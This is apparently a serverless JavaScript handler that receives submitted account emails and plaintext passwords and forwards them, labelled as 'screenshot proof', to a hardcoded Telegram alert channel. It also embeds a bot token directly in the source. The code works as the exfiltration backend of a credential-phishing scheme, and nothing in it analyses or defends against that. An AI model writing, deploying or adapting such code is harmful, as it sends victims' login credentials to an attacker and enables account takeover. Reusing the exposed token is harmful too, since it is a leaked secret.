const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN || '8236893425:AAFNPK6GnoTkxyjjSI4WgRYbhwZIf_zS-9w');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const formData = event.body;
        const userId = formData.userId;
        const account = JSON.parse(formData.account);

        // Send proof to Telegram channel
        await bot.telegram.sendMessage(
            -1002564024778, // Your alert channel
            `📸 Screenshot Proof Received!\n\n` +
            `👤 User: ${userId}\n` +
            `📧 Email: ${account.email}\n` +
            `🔐 Pass: ${account.password}\n` +
            `⏰ Time: ${new Date().toLocaleString()}`
        );

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Proof sent successfully' })
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
